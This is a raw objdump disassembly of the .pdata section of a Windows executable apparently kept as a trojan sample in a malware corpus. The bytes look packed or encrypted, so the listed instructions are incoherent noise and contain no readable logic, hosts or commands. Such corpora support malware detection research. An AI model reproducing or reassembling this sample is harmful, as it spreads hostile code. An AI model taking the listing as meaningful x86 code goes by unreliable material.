
malware_samples/trojan/65ca7ba84aab380f567de480f63624c3443c26b0df33d8b4869132c6640bcec3.exe:     file format pei-i386


Disassembly of section .pdata:

00406000 <.pdata>:
  406000:	5e                   	pop    %esi
  406001:	00 00                	add    %al,(%eax)
  406003:	80 00 00             	addb   $0x0,(%eax)
  406006:	45                   	inc    %ebp
  406007:	b0 54                	mov    $0x54,%al
  406009:	e0 01                	loopne 0x40600c
  40600b:	b2 57                	mov    $0x57,%dl
  40600d:	2a 17                	sub    (%edi),%dl
  40600f:	2f                   	das
  406010:	05 53 d1 e5 a6       	add    $0xa6e5d153,%eax
  406015:	09 09                	or     %ecx,(%ecx)
  406017:	29 4a 24             	sub    %ecx,0x24(%edx)
  40601a:	c4 be c1 b7 eb 8a    	les    -0x7514483f(%esi),%edi
  406020:	d4 51                	aam    $0x51
  406022:	74 bd                	je     0x405fe1
  406024:	0d 38 67 e0 c1       	or     $0xc1e06738,%eax
  406029:	79 92                	jns    0x405fbd
  40602b:	de 99 b2 71 be 7e    	ficomps 0x7ebe71b2(%ecx)
  406031:	e2 88                	loop   0x405fbb
  406033:	0c 1f                	or     $0x1f,%al
  406035:	47                   	inc    %edi
  406036:	b0 de                	mov    $0xde,%al
  406038:	96                   	xchg   %eax,%esi
  406039:	63 4d 6d             	arpl   %ecx,0x6d(%ebp)
  40603c:	a9 dc f6 a4 fc       	test   $0xfca4f6dc,%eax
  406041:	74 d6                	je     0x406019
  406043:	36 ec                	ss in  (%dx),%al
  406045:	8c 6e 10             	mov    %gs,0x10(%esi)
  406048:	76 2a                	jbe    0x406074
  40604a:	9c                   	pushf
  40604b:	b3 ef                	mov    $0xef,%bl
  40604d:	72 e3                	jb     0x406032
  40604f:	b0 40                	mov    $0x40,%al
  406051:	15 69 56 60 d7       	adc    $0xd7605669,%eax
  406056:	96                   	xchg   %eax,%esi
  406057:	d1 f2                	shl    $1,%edx
  406059:	29 5b 57             	sub    %ebx,0x57(%ebx)
  40605c:	5f                   	pop    %edi
  40605d:	35 e7 18 75 27       	xor    $0x277518e7,%eax
  406062:	4d                   	dec    %ebp
  406063:	4f                   	dec    %edi
  406064:	2c 21                	sub    $0x21,%al
  406066:	b8 d9 e4 da 18       	mov    $0x18dae4d9,%eax
  40606b:	c8 d5 60 15          	enter  $0x60d5,$0x15
  40606f:	56                   	push   %esi
  406070:	2f                   	das
  406071:	5a                   	pop    %edx
  406072:	e7 60                	out    %eax,$0x60
  406074:	09 f0                	or     %esi,%eax
  406076:	9a 2f 2e f9 41 cd ee 	lcall  $0xeecd,$0x41f92e2f
  40607d:	eb 07                	jmp    0x406086
  40607f:	de b8 70 d8 91 3c    	fidivrs 0x3c91d870(%eax)
  406085:	f9                   	stc
  406086:	7b 4d                	jnp    0x4060d5
  406088:	82 af 5a cc a4 a7 73 	subb   $0x73,-0x585b33a6(%edi)
  40608f:	5d                   	pop    %ebp
  406090:	15 6d b9 4e 9d       	adc    $0x9d4eb96d,%eax
  406095:	c2 8c 07             	ret    $0x78c
  406098:	2c 2a                	sub    $0x2a,%al
  40609a:	5d                   	pop    %ebp
  40609b:	2e e8 03 05 0a a0    	cs call 0xa04a65a4
  4060a1:	55                   	push   %ebp
  4060a2:	69 9e d2 53 3a 11 aa 	imul   $0xc5ba97aa,0x113a53d2(%esi),%ebx
  4060a9:	97 ba c5 
  4060ac:	6a 57                	push   $0x57
  4060ae:	63 2c d8             	arpl   %ebp,(%eax,%ebx,8)
  4060b1:	96                   	xchg   %eax,%esi
  4060b2:	e3 4a                	jecxz  0x4060fe
  4060b4:	00 81 e4 6d 55 e7    	add    %al,-0x18aa921c(%ecx)
  4060ba:	6d                   	insl   (%dx),%es:(%edi)
  4060bb:	fd                   	std
  4060bc:	7a 51                	jp     0x40610f
  4060be:	67 f1                	addr16 int1
  4060c0:	89 4c b9 8c          	mov    %ecx,-0x74(%ecx,%edi,4)
  4060c4:	37                   	aaa
  4060c5:	94                   	xchg   %eax,%esp
  4060c6:	de 5d de             	ficomps -0x22(%ebp)
  4060c9:	ea d6 48 e4 4d 5a 29 	ljmp   $0x295a,$0x4de448d6
  4060d0:	39 fb                	cmp    %edi,%ebx
  4060d2:	d6                   	salc
  4060d3:	f3 e1 90             	repz loope 0x406066
  4060d6:	e8 e7 fe 7e 03       	call   0x3bf5fc2
  4060db:	8b 0c 4c             	mov    (%esp,%ecx,2),%ecx
  4060de:	2e 10 a0 e4 27 75 9f 	adc    %ah,%cs:-0x608ad81c(%eax)
  4060e5:	2f                   	das
  4060e6:	da 4b 57             	fimull 0x57(%ebx)
  4060e9:	d6                   	salc
  4060ea:	eb 5b                	jmp    0x406147
  4060ec:	f1                   	int1
  4060ed:	92                   	xchg   %eax,%edx
  4060ee:	38 7f 6a             	cmp    %bh,0x6a(%edi)
  4060f1:	e5 86                	in     $0x86,%eax
  4060f3:	7d 5a                	jge    0x40614f
  4060f5:	51                   	push   %ecx
  4060f6:	9b                   	fwait
  4060f7:	fa                   	cli
  4060f8:	d9 53 7b             	fsts   0x7b(%ebx)
  4060fb:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4060fc:	60                   	pusha
  4060fd:	f1                   	int1
  4060fe:	e3 9d                	jecxz  0x40609d
  406100:	6f                   	outsl  %ds:(%esi),(%dx)
  406101:	bb 39 a8 00 15       	mov    $0x1500a839,%ebx
  406106:	d7                   	xlat   %ds:(%ebx)
  406107:	57                   	push   %edi
  406108:	2e 37                	cs aaa
  40610a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40610b:	e4 dd                	in     $0xdd,%al
  40610d:	a9 63 fb a4 0f       	test   $0xfa4fb63,%eax
  406112:	b5 9e                	mov    $0x9e,%ch
  406114:	0b 9b aa f1 88 e0    	or     -0x1f770e56(%ebx),%ebx
  40611a:	d4 d6                	aam    $0xd6
  40611c:	34 c9                	xor    $0xc9,%al
  40611e:	12 45 89             	adc    -0x77(%ebp),%al
  406121:	6e                   	outsb  %ds:(%esi),(%dx)
  406122:	67 2a 1f             	sub    (%bx),%bl
  406125:	43                   	inc    %ebx
  406126:	8c da                	mov    %ds,%edx
  406128:	74 c8                	je     0x4060f2
  40612a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40612b:	bd b2 b2 92 38       	mov    $0x3892b2b2,%ebp
  406130:	79 09                	jns    0x40613b
  406132:	ae                   	scas   %es:(%edi),%al
  406133:	fc                   	cld
  406134:	a9 54 b3 a0 5f       	test   $0x5fa0b354,%eax
  406139:	ef                   	out    %eax,(%dx)
  40613a:	59                   	pop    %ecx
  40613b:	4c                   	dec    %esp
  40613c:	e1 92                	loope  0x4060d0
  40613e:	21 78 77             	and    %edi,0x77(%eax)
  406141:	7d 42                	jge    0x406185
  406143:	fb                   	sti
  406144:	bf 2d a5 f7 e4       	mov    $0xe4f7a52d,%edi
  406149:	cb                   	lret
  40614a:	a0 22 33 50 e0       	mov    0xe0503322,%al
  40614f:	71 01                	jno    0x406152
  406151:	0c a9                	or     $0xa9,%al
  406153:	a2 d6 93 97 04       	mov    %al,0x49793d6
  406158:	53                   	push   %ebx
  406159:	ae                   	scas   %es:(%edi),%al
  40615a:	1b 4c e3 ee          	sbb    -0x12(%ebx,%eiz,8),%ecx
  40615e:	66 95                	xchg   %ax,%bp
  406160:	88 55 75             	mov    %dl,0x75(%ebp)
  406163:	6c                   	insb   (%dx),%es:(%edi)
  406164:	f5                   	cmc
  406165:	4f                   	dec    %edi
  406166:	7f 83                	jg     0x4060eb
  406168:	d3 2a                	shrl   %cl,(%edx)
  40616a:	ba 05 78 17 49       	mov    $0x49177805,%edx
  40616f:	d9 24 72             	fldenv (%edx,%esi,2)
  406172:	51                   	push   %ecx
  406173:	7a 70                	jp     0x4061e5
  406175:	d6                   	salc
  406176:	d7                   	xlat   %ds:(%ebx)
  406177:	12 f5                	adc    %ch,%dh
  406179:	8e 30                	mov    (%eax),%?
  40617b:	35 23 ef de 4f       	xor    $0x4fdeef23,%eax
  406180:	60                   	pusha
  406181:	1b 17                	sbb    (%edi),%edx
  406183:	3f                   	aas
  406184:	9b                   	fwait
  406185:	27                   	daa
  406186:	2e 5b                	cs pop %ebx
  406188:	ce                   	into
  406189:	8a 8d fc 88 c0 d4    	mov    -0x2b3f7704(%ebp),%cl
  40618f:	69 98 2a e0 7b d3 57 	imul   $0x185ba857,-0x2c841fd6(%eax),%ebx
  406196:	a8 5b 18 
  406199:	4f                   	dec    %edi
  40619a:	be 34 d3 83 25       	mov    $0x2583d334,%esi
  40619f:	6f                   	outsl  %ds:(%esi),(%dx)
  4061a0:	5b                   	pop    %ebx
  4061a1:	9c                   	pushf
  4061a2:	ca 6a 0d             	lret   $0xd6a
  4061a5:	56                   	push   %esi
  4061a6:	94                   	xchg   %eax,%esp
  4061a7:	d4 f9                	aam    $0xf9
  4061a9:	40                   	inc    %eax
  4061aa:	fa                   	cli
  4061ab:	47                   	inc    %edi
  4061ac:	ba 81 c5 ea fc       	mov    $0xfceac581,%edx
  4061b1:	c3                   	ret
  4061b2:	ec                   	in     (%dx),%al
  4061b3:	da 66 65             	fisubl 0x65(%esi)
  4061b6:	f2 88 a3 92 dc c0 9e 	repnz mov %ah,-0x613f236e(%ebx)
  4061bd:	dc 3a                	fdivrl (%edx)
  4061bf:	e0 6f                	loopne 0x406230
  4061c1:	ca d6 bc             	lret   $0xbcd6
  4061c4:	d6                   	salc
  4061c5:	f2 86 c6             	repnz xchg %al,%dh
  4061c8:	0a a1 c7 fb 3e 4f    	or     0x4f3efbc7(%ecx),%ah
  4061ce:	f8                   	clc
  4061cf:	4e                   	dec    %esi
  4061d0:	28 c7                	sub    %al,%bh
  4061d2:	31 99 ed c8 06 37    	xor    %ebx,0x3706c8ed(%ecx)
  4061d8:	ec                   	in     (%dx),%al
  4061d9:	75 32                	jne    0x40620d
  4061db:	8e de                	mov    %esi,%ds
  4061dd:	5f                   	pop    %edi
  4061de:	02 6d c7             	add    -0x39(%ebp),%ch
  4061e1:	89 ae fa 7c 3b d8    	mov    %ebp,-0x27c48306(%esi)
  4061e7:	6b 89 8d 1d 76 02 8c 	imul   $0xffffff8c,0x2761d8d(%ecx),%ecx
  4061ee:	7e 4e                	jle    0x40623e
  4061f0:	ac                   	lods   %ds:(%esi),%al
  4061f1:	26 db 86 01 66 38 fb 	fildl  %es:-0x4c799ff(%esi)
  4061f8:	69 80 93 73 5c 42 aa 	imul   $0xc05837aa,0x425c7393(%eax),%eax
  4061ff:	37 58 c0 
  406202:	14 de                	adc    $0xde,%al
  406204:	48                   	dec    %eax
  406205:	41                   	inc    %ecx
  406206:	c7                   	(bad)
  406207:	4c                   	dec    %esp
  406208:	7b 22                	jnp    0x40622c
  40620a:	ff 9f c5 ed da 54    	lcall  *0x54daedc5(%edi)
  406210:	0a 0d 80 e1 30 f6    	or     0xf630e180,%cl
  406216:	8c 3d 3f 41 9a d3    	mov    %?,0xd39a413f
  40621c:	dc f0                	fdiv   %st,%st(0)
  40621e:	38 ed                	cmp    %ch,%ch
  406220:	d6                   	salc
  406221:	36 ba 19 8e 5f d7    	ss mov $0xd75f8e19,%edx
  406227:	bd bd 06 9d 0d       	mov    $0xd9d06bd,%ebp
  40622c:	aa                   	stos   %al,%es:(%edi)
  40622d:	94                   	xchg   %eax,%esp
  40622e:	58                   	pop    %eax
  40622f:	e2 23                	loop   0x406254
  406231:	cc                   	int3
  406232:	8a 1f                	mov    (%edi),%bl
  406234:	01 97 66 a8 7d d5    	add    %edx,-0x2a82579a(%edi)
  40623a:	78 5d                	js     0x406299
  40623c:	2f                   	das
  40623d:	38 02                	cmp    %al,(%edx)
  40623f:	db d5                	fcmovnbe %st(5),%st
  406241:	70 3c                	jo     0x40627f
  406243:	ac                   	lods   %ds:(%esi),%al
  406244:	7b ae                	jnp    0x4061f4
  406246:	80 7a 41 c7          	cmpb   $0xc7,0x41(%edx)
  40624a:	2b 30                	sub    (%eax),%esi
  40624c:	82 9a 98 72 d4 9b 41 	sbbb   $0x41,-0x642b8d68(%edx)
  406253:	96                   	xchg   %eax,%esi
  406254:	e8 26 26 11 c9       	call   0xc951887f
  406259:	37                   	aaa
  40625a:	d8 b8 5c be 7e fe    	fdivrs -0x18141a4(%eax)
  406260:	13 8a 54 38 96 b0    	adc    -0x4f69c7ac(%edx),%ecx
  406266:	49                   	dec    %ecx
  406267:	02 24 32             	add    (%edx,%esi,1),%ah
  40626a:	c3                   	ret
  40626b:	87 82 45 a7 ad 47    	xchg   %eax,0x47ada745(%edx)
  406271:	f8                   	clc
  406272:	f6 33                	divb   (%ebx)
  406274:	a1 87 00 d2 b2       	mov    0xb2d20087,%eax
  406279:	f0 b5 f3             	lock mov $0xf3,%ch
  40627c:	6f                   	outsl  %ds:(%esi),(%dx)
  40627d:	bf 18 ec 5f 6e       	mov    $0x6e5fec18,%edi
  406282:	f9                   	stc
  406283:	48                   	dec    %eax
  406284:	bb f9 61 80 2c       	mov    $0x2c8061f9,%ebx
  406289:	85 85 a1 a2 9c 16    	test   %eax,0x169ca2a1(%ebp)
  40628f:	79 b9                	jns    0x40624a
  406291:	9c                   	pushf
  406292:	4c                   	dec    %esp
  406293:	80 01 5c             	addb   $0x5c,(%ecx)
  406296:	2c 70                	sub    $0x70,%al
  406298:	90                   	nop
  406299:	14 58                	adc    $0x58,%al
  40629b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40629c:	ea 24 ee 49 94 f5 8d 	ljmp   $0x8df5,$0x9449ee24
  4062a3:	5b                   	pop    %ebx
  4062a4:	06                   	push   %es
  4062a5:	e2 2e                	loop   0x4062d5
  4062a7:	f1                   	int1
  4062a8:	f7 bc 10 80 56 f6 e1 	idivl  -0x1e09a980(%eax,%edx,1)
  4062af:	d3 e0                	shl    %cl,%eax
  4062b1:	c8 57 65 6e          	enter  $0x6557,$0x6e
  4062b5:	cd 1b                	int    $0x1b
  4062b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4062b8:	95                   	xchg   %eax,%ebp
  4062b9:	78 d4                	js     0x40628f
  4062bb:	32 e3                	xor    %bl,%ah
  4062bd:	c1 16 cb             	rcll   $0xcb,(%esi)
  4062c0:	65 df 3d fa 2c a4 0c 	fistpll %gs:0xca42cfa
  4062c7:	56                   	push   %esi
  4062c8:	1f                   	pop    %ds
  4062c9:	f5                   	cmc
  4062ca:	f3 40                	repz inc %eax
  4062cc:	31 b0 25 8d 34 43    	xor    %esi,0x43348d25(%eax)
  4062d2:	e5 9d                	in     $0x9d,%eax
  4062d4:	18 99 10 b7 bf 64    	sbb    %bl,0x64bfb710(%ecx)
  4062da:	4d                   	dec    %ebp
  4062db:	43                   	inc    %ebx
  4062dc:	67 c3                	addr16 ret
  4062de:	40                   	inc    %eax
  4062df:	0a 4f fe             	or     -0x2(%edi),%cl
  4062e2:	a9 ea a3 70 1a       	test   $0x1a70a3ea,%eax
  4062e7:	92                   	xchg   %eax,%edx
  4062e8:	93                   	xchg   %eax,%ebx
  4062e9:	87 80 ac e1 ea 57    	xchg   %eax,0x57eae1ac(%eax)
  4062ef:	cb                   	lret
  4062f0:	78 73                	js     0x406365
  4062f2:	36 b3 39             	ss mov $0x39,%bl
  4062f5:	1a 89 dc 7b ca 91    	sbb    -0x6e358424(%ecx),%cl
  4062fb:	3b 85 81 76 c0 e6    	cmp    -0x193f897f(%ebp),%eax
  406301:	66 31 64 99 76       	xor    %sp,0x76(%ecx,%ebx,4)
  406306:	9f                   	lahf
  406307:	6f                   	outsl  %ds:(%esi),(%dx)
  406308:	55                   	push   %ebp
  406309:	e7 58                	out    %eax,$0x58
  40630b:	f9                   	stc
  40630c:	5f                   	pop    %edi
  40630d:	1b 96 86 70 67 d8    	sbb    -0x27988f7a(%esi),%edx
  406313:	92                   	xchg   %eax,%edx
  406314:	6c                   	insb   (%dx),%es:(%edi)
  406315:	04 b8                	add    $0xb8,%al
  406317:	02 c9                	add    %cl,%cl
  406319:	b2 3e                	mov    $0x3e,%dl
  40631b:	f8                   	clc
  40631c:	2a ba a6 e3 c4 d1    	sub    -0x2e3b1c5a(%edx),%bh
  406322:	02 56 75             	add    0x75(%esi),%dl
  406325:	8c e3                	mov    %fs,%ebx
  406327:	f9                   	stc
  406328:	eb c8                	jmp    0x4062f2
  40632a:	71 00                	jno    0x40632c
  40632c:	37                   	aaa
  40632d:	14 79                	adc    $0x79,%al
  40632f:	8f                   	(bad)
  406330:	a1 31 f6 26 b2       	mov    0xb226f631,%eax
  406335:	56                   	push   %esi
  406336:	31 75 1a             	xor    %esi,0x1a(%ebp)
  406339:	16                   	push   %ss
  40633a:	5a                   	pop    %edx
  40633b:	86 90 25 ed a4 6d    	xchg   %dl,0x6da4ed25(%eax)
  406341:	8f                   	(bad)
  406342:	f5                   	cmc
  406343:	48                   	dec    %eax
  406344:	eb 74                	jmp    0x4063ba
  406346:	4c                   	dec    %esp
  406347:	d6                   	salc
  406348:	5d                   	pop    %ebp
  406349:	f6 0e 05             	testb  $0x5,(%esi)
  40634c:	11 01                	adc    %eax,(%ecx)
  40634e:	97                   	xchg   %eax,%edi
  40634f:	0d a0 66 e0 ca       	or     $0xcae066a0,%eax
  406354:	14 cf                	adc    $0xcf,%al
  406356:	48                   	dec    %eax
  406357:	34 ad                	xor    $0xad,%al
  406359:	5b                   	pop    %ebx
  40635a:	ae                   	scas   %es:(%edi),%al
  40635b:	07                   	pop    %es
  40635c:	4e                   	dec    %esi
  40635d:	63 f4                	arpl   %esi,%esp
  40635f:	de 44 0e df          	fiadds -0x21(%esi,%ecx,1)
  406363:	1f                   	pop    %ds
  406364:	34 7c                	xor    $0x7c,%al
  406366:	ce                   	into
  406367:	95                   	xchg   %eax,%ebp
  406368:	d1 14 64             	rcll   $1,(%esp,%eiz,2)
  40636b:	24 b5                	and    $0xb5,%al
  40636d:	9a f6 5b 52 a7 23 76 	lcall  $0x7623,$0xa7525bf6
  406374:	6c                   	insb   (%dx),%es:(%edi)
  406375:	75 15                	jne    0x40638c
  406377:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406378:	ba 72 dd dc d9       	mov    $0xd9dcdd72,%edx
  40637d:	f9                   	stc
  40637e:	46                   	inc    %esi
  40637f:	b9 80 57 eb 7e       	mov    $0x7eeb5780,%ecx
  406384:	1a 65 84             	sbb    -0x7c(%ebp),%ah
  406387:	05 5f 04 57 43       	add    $0x4357045f,%eax
  40638c:	b0 bf                	mov    $0xbf,%al
  40638e:	d8 af 43 31 ad 16    	fsubrs 0x16ad3143(%edi)
  406394:	f0 9b                	lock fwait
  406396:	71 f9                	jno    0x406391
  406398:	e1 36                	loope  0x4063d0
  40639a:	cd 50                	int    $0x50
  40639c:	31 75 6e             	xor    %esi,0x6e(%ebp)
  40639f:	69 c7 85 a5 58 7c    	imul   $0x7c58a585,%edi,%eax
  4063a5:	e7 43                	out    %eax,$0x43
  4063a7:	84 63 28             	test   %ah,0x28(%ebx)
  4063aa:	00 52 9d             	add    %dl,-0x63(%edx)
  4063ad:	29 74 25 1c          	sub    %esi,0x1c(%ebp,%eiz,1)
  4063b1:	c8 56 19 d9          	enter  $0x1956,$0xd9
  4063b5:	84 a6 63 6e 09 a4    	test   %ah,-0x5bf6919d(%esi)
  4063bb:	e5 50                	in     $0x50,%eax
  4063bd:	64 a8 34             	fs test $0x34,%al
  4063c0:	5a                   	pop    %edx
  4063c1:	50                   	push   %eax
  4063c2:	93                   	xchg   %eax,%ebx
  4063c3:	e3 0d                	jecxz  0x4063d2
  4063c5:	52                   	push   %edx
  4063c6:	ba d2 48 ff dc       	mov    $0xdcff48d2,%edx
  4063cb:	99                   	cltd
  4063cc:	2f                   	das
  4063cd:	59                   	pop    %ecx
  4063ce:	d9 6a a6             	fldcw  -0x5a(%edx)
  4063d1:	e1 27                	loope  0x4063fa
  4063d3:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4063d4:	eb fa                	jmp    0x4063d0
  4063d6:	98                   	cwtl
  4063d7:	64 ab                	fs stos %eax,%es:(%edi)
  4063d9:	16                   	push   %ss
  4063da:	51                   	push   %ecx
  4063db:	2f                   	das
  4063dc:	e9 58 f5 98 e8       	jmp    0xe8d95939
  4063e1:	cc                   	int3
  4063e2:	d6                   	salc
  4063e3:	54                   	push   %esp
  4063e4:	4c                   	dec    %esp
  4063e5:	80 b0 41 56 51 4d f4 	xorb   $0xf4,0x4d515641(%eax)
  4063ec:	8b 02                	mov    (%edx),%eax
  4063ee:	92                   	xchg   %eax,%edx
  4063ef:	01 f1                	add    %esi,%ecx
  4063f1:	ef                   	out    %eax,(%dx)
  4063f2:	f0 69 7c a4 65 67 97 	lock imul $0x31019767,0x65(%esp,%eiz,4),%edi
  4063f9:	01 31 
  4063fb:	f8                   	clc
  4063fc:	c7                   	(bad)
  4063fd:	34 97                	xor    $0x97,%al
  4063ff:	46                   	inc    %esi
  406400:	95                   	xchg   %eax,%ebp
  406401:	3a 1d 44 df 24 a6    	cmp    0xa624df44,%bl
  406407:	0b 5e f6             	or     -0xa(%esi),%ebx
  40640a:	05 ad ff 63 65       	add    $0x6563ffad,%eax
  40640f:	08 58 6a             	or     %bl,0x6a(%eax)
  406412:	08 14 f1             	or     %dl,(%ecx,%esi,8)
  406415:	1e                   	push   %ds
  406416:	f0 e4 e2             	lock in $0xe2,%al
  406419:	8f                   	(bad)
  40641a:	2c 04                	sub    $0x4,%al
  40641c:	85 51 d3             	test   %edx,-0x2d(%ecx)
  40641f:	71 0e                	jno    0x40642f
  406421:	8b 48 df             	mov    -0x21(%eax),%ecx
  406424:	20 cf                	and    %cl,%bh
  406426:	83 a9 6d bd 4d 83 3b 	subl   $0x3b,-0x7cb24293(%ecx)
  40642d:	08 30                	or     %dh,(%eax)
  40642f:	be 4d cf 03 03       	mov    $0x303cf4d,%esi
  406434:	d1 fc                	sar    $1,%esp
  406436:	7c 57                	jl     0x40648f
  406438:	e2 c7                	loop   0x406401
  40643a:	89 83 df 70 2d 59    	mov    %eax,0x592d70df(%ebx)
  406440:	c1 3e 0e             	sarl   $0xe,(%esi)
  406443:	4d                   	dec    %ebp
  406444:	38 01                	cmp    %al,(%ecx)
  406446:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406447:	b1 e3                	mov    $0xe3,%cl
  406449:	78 a0                	js     0x4063eb
  40644b:	c3                   	ret
  40644c:	56                   	push   %esi
  40644d:	f7 ee                	imul   %esi
  40644f:	f5                   	cmc
  406450:	02 d2                	add    %dl,%dl
  406452:	eb b6                	jmp    0x40640a
  406454:	9d                   	popf
  406455:	8a 62 e3             	mov    -0x1d(%edx),%ah
  406458:	9c                   	pushf
  406459:	4b                   	dec    %ebx
  40645a:	31 a1 02 ed 36 37    	xor    %esp,0x3736ed02(%ecx)
  406460:	70 67                	jo     0x4064c9
  406462:	6b 1f 62             	imul   $0x62,(%edi),%ebx
  406465:	bc 57 c6 70 ba       	mov    $0xba70c657,%esp
  40646a:	85 7e 1e             	test   %edi,0x1e(%esi)
  40646d:	d2 0d 9f c3 2c 94    	rorb   %cl,0x942cc39f
  406473:	ad                   	lods   %ds:(%esi),%eax
  406474:	50                   	push   %eax
  406475:	84 e4                	test   %ah,%ah
  406477:	d5 fd                	aad    $0xfd
  406479:	88 c5                	mov    %al,%ch
  40647b:	a2 c4 42 4a a9       	mov    %al,0xa94a42c4
  406480:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406481:	51                   	push   %ecx
  406482:	2b 6d e3             	sub    -0x1d(%ebp),%ebp
  406485:	33 0f                	xor    (%edi),%ecx
  406487:	ca 86 bf             	lret   $0xbf86
  40648a:	e5 c0                	in     $0xc0,%eax
  40648c:	0b 4f 05             	or     0x5(%edi),%ecx
  40648f:	e4 63                	in     $0x63,%al
  406491:	59                   	pop    %ecx
  406492:	f7 5a d1             	negl   -0x2f(%edx)
  406495:	5b                   	pop    %ebx
  406496:	93                   	xchg   %eax,%ebx
  406497:	76 64                	jbe    0x4064fd
  406499:	1a bd 0b 4a f2 dd    	sbb    -0x220db5f5(%ebp),%bh
  40649f:	49                   	dec    %ecx
  4064a0:	2d 1e 74 03 8b       	sub    $0x8b03741e,%eax
  4064a5:	a0 a7 71 0d 84       	mov    0x840d71a7,%al
  4064aa:	53                   	push   %ebx
  4064ab:	25 f9 32 1f 7d       	and    $0x7d1f32f9,%eax
  4064b0:	9e                   	sahf
  4064b1:	48                   	dec    %eax
  4064b2:	c3                   	ret
  4064b3:	50                   	push   %eax
  4064b4:	4f                   	dec    %edi
  4064b5:	4e                   	dec    %esi
  4064b6:	21 bf fa 7b 87 71    	and    %edi,0x71877bfa(%edi)
  4064bc:	cc                   	int3
  4064bd:	2b ba f9 fd c4 a6    	sub    -0x593b0207(%edx),%edi
  4064c3:	49                   	dec    %ecx
  4064c4:	7a 9f                	jp     0x406465
  4064c6:	df 33                	fbstp  (%ebx)
  4064c8:	02 84 30 40 f0 12 d2 	add    -0x2ded0fc0(%eax,%esi,1),%al
  4064cf:	b2 6b                	mov    $0x6b,%dl
  4064d1:	76 6b                	jbe    0x40653e
  4064d3:	86 1c 8a             	xchg   %bl,(%edx,%ecx,4)
  4064d6:	83 52 e5 66          	adcl   $0x66,-0x1b(%edx)
  4064da:	76 73                	jbe    0x40654f
  4064dc:	b4 cb                	mov    $0xcb,%ah
  4064de:	3d f6 d2 f8 10       	cmp    $0x10f8d2f6,%eax
  4064e3:	da 37                	fidivl (%edi)
  4064e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4064e6:	0e                   	push   %cs
  4064e7:	13 e6                	adc    %esi,%esp
  4064e9:	00 9d a4 b5 0b b6    	add    %bl,-0x49f44a5c(%ebp)
  4064ef:	0e                   	push   %cs
  4064f0:	01 f2                	add    %esi,%edx
  4064f2:	78 83                	js     0x406477
  4064f4:	d9 c8                	fxch   %st(0)
  4064f6:	5e                   	pop    %esi
  4064f7:	98                   	cwtl
  4064f8:	d9 02                	flds   (%edx)
  4064fa:	db 1d 13 85 cf 28    	fistpl 0x28cf8513
  406500:	48                   	dec    %eax
  406501:	b3 9f                	mov    $0x9f,%bl
  406503:	c5 98 24 5c d6 7c    	lds    0x7cd65c24(%eax),%ebx
  406509:	50                   	push   %eax
  40650a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40650b:	51                   	push   %ecx
  40650c:	4f                   	dec    %edi
  40650d:	84 8e 38 ec 5c 36    	test   %cl,0x365cec38(%esi)
  406513:	c8 0b b5 1a          	enter  $0xb50b,$0x1a
  406517:	f3 95                	repz xchg %eax,%ebp
  406519:	67 52                	addr16 push %edx
  40651b:	27                   	daa
  40651c:	2d 4b 01 cd 23       	sub    $0x23cd014b,%eax
  406521:	66 79 f9             	data16 jns 0x40651d
  406524:	f0 7d 7b             	lock jge 0x4065a2
  406527:	23 17                	and    (%edi),%edx
  406529:	98                   	cwtl
  40652a:	d9 8f 65 2a e6 0a    	(bad) 0xae62a65(%edi)
  406530:	88 34 25 9a 56 3d 83 	mov    %dh,-0x7cc2a966(,%eiz,1)
  406537:	4d                   	dec    %ebp
  406538:	02 97 db 87 b8 ce    	add    -0x31477825(%edi),%dl
  40653e:	ca b2 29             	lret   $0x29b2
  406541:	27                   	daa
  406542:	bb db f6 be b3       	mov    $0xb3bef6db,%ebx
  406547:	28 a5 80 02 17 44    	sub    %ah,0x44170280(%ebp)
  40654d:	2b b6 d8 2d e9 9a    	sub    -0x6516d228(%esi),%esi
  406553:	4b                   	dec    %ebx
  406554:	5c                   	pop    %esp
  406555:	ea 91 44 3c 13 74 36 	ljmp   $0x3674,$0x133c4491
  40655c:	bb 0d f9 f2 1d       	mov    $0x1df2f90d,%ebx
  406561:	97                   	xchg   %eax,%edi
  406562:	63 5a 53             	arpl   %ebx,0x53(%edx)
  406565:	f2 ca fa a1          	repnz lret $0xa1fa
  406569:	7b 11                	jnp    0x40657c
  40656b:	05 97 78 4b 74       	add    $0x744b7897,%eax
  406570:	8f                   	(bad)
  406571:	8c ae 1b 4f 5c e3    	mov    %gs,-0x1ca3b0e5(%esi)
  406577:	95                   	xchg   %eax,%ebp
  406578:	9e                   	sahf
  406579:	0f 44 f3             	cmove  %ebx,%esi
  40657c:	cc                   	int3
  40657d:	da b1 04 e8 e6 64    	fidivl 0x64e6e804(%ecx)
  406583:	b0 2e                	mov    $0x2e,%al
  406585:	eb 62                	jmp    0x4065e9
  406587:	cb                   	lret
  406588:	b1 34                	mov    $0x34,%cl
  40658a:	50                   	push   %eax
  40658b:	4b                   	dec    %ebx
  40658c:	1e                   	push   %ds
  40658d:	47                   	inc    %edi
  40658e:	ad                   	lods   %ds:(%esi),%eax
  40658f:	97                   	xchg   %eax,%edi
  406590:	ae                   	scas   %es:(%edi),%al
  406591:	62 0d 60 3e 99 ba    	bound  %ecx,0xba993e60
  406597:	3d 5b 7f f0 b7       	cmp    $0xb7f07f5b,%eax
  40659c:	28 e4                	sub    %ah,%ah
  40659e:	73 41                	jae    0x4065e1
  4065a0:	5d                   	pop    %ebp
  4065a1:	17                   	pop    %ss
  4065a2:	70 4a                	jo     0x4065ee
  4065a4:	b9 c1 66 e6 35       	mov    $0x35e666c1,%ecx
  4065a9:	cd ac                	int    $0xac
  4065ab:	bf 8f b2 c2 91       	mov    $0x91c2b28f,%edi
  4065b0:	d5 d7                	aad    $0xd7
  4065b2:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4065b3:	a2 54 14 1f 4d       	mov    %al,0x4d1f1454
  4065b8:	1d 0c f9 dd d1       	sbb    $0xd1ddf90c,%eax
  4065bd:	d9 d9                	(bad)
  4065bf:	52                   	push   %edx
  4065c0:	95                   	xchg   %eax,%ebp
  4065c1:	54                   	push   %esp
  4065c2:	ae                   	scas   %es:(%edi),%al
  4065c3:	65 45                	gs inc %ebp
